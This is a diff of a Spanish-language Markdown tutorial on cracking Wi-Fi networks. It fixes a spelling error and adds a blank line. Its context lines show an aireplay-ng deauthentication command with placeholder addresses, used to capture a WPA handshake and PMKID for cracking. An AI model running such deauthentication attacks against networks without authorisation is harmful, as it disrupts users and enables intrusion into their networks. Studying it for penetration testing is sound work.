@@ -24,7 +24,7 @@ El Handshake lo obtenemos por medio de un ataque de **des-autenticación**.
 
 ## DeAuth
 
-Para hacer esto, nos vamos a otra terminal y ponermos:
+Para hacer esto, nos vamos a otra terminal y ponemos:
 
 ```bash
 sudo aireplay-ng -0 5 -a <BSSID> -c <client-bssid> wlan0mon
@@ -53,3 +53,4 @@ Debemos ver:
 
 
 Ya con esto podemos hacer el ataque, podemos crackear la red Wi-Fi. También conseguimos el `PMKID`.
+
